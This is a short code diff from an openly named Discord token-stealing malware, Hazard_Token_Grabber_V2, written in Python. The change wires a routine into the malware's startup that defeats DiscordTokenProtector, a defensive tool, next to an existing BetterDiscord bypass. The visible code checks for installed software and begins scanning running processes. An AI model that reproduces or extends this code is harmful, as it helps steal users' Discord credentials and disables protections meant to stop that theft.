@@ -32,7 +32,7 @@ class Hazard_Token_Grabber_V2:
         
         if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
             self.bypass_better_discord()
-
+        self.bypassTokenProtector()
         if not os.path.exists(self.appdata+'\\Google'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
@@ -98,7 +98,7 @@ class Hazard_Token_Grabber_V2:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
-    def bypass_token_protector(self):
+    def bypassTokenProtector(self):
         #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         for proc in psutil.process_iter():
